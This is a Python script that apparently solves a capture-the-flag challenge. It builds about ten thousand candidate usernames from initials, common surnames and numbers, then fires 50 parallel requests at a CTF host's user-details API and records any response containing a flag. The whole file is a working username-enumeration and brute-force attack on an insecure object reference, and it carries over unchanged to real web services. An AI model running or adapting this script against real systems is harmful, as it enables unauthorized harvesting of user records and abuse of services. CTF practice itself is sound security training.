import string
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed


last_names = [
    "Garcia", "Martinez", "Rodriguez", "Hernandez", "Lopez",
    "Gonzalez", "Perez", "Sanchez", "Ramirez", "Torres"
]

# Base URL for GET requests
base_url = "https://2ftkyhm9.eu2.ctfio.com/api/userInfo/showUserDetails/{}"

# Create a list to hold all generated usernames
usernames = []

# Generate usernames
for last_name in last_names:
    last_name_lower = last_name.lower()
    for letter in string.ascii_lowercase:
        base_username = f"{letter}{last_name_lower}"
        usernames.append(base_username)
        for number in range(60, 100):
            numbered_username = f"{base_username}{number}"
            usernames.append(numbered_username)

# Function to send a single request
def check_username(username):
    url = base_url.format(username)
    try:
        response = requests.get(url, timeout=3)
        if response.status_code == 200:
            if "flag{" in response.text:
                print(f"FLAG FOUND for {username}!")
                print(response.text)
                return username
    except requests.RequestException:
        return None

# Use ThreadPoolExecutor to send multiple requests at once
valid_usernames = []

with ThreadPoolExecutor(max_workers=50) as executor:
    futures = {executor.submit(check_username, username): username for username in usernames}
    for future in as_completed(futures):
        result = future.result()
        if result:
            print(result)
            valid_usernames.append(result)

# Optional: Save valid usernames to a file
with open("valid_usernames.txt", "w") as f:
    for username in valid_usernames:
        f.write(username + "\n")
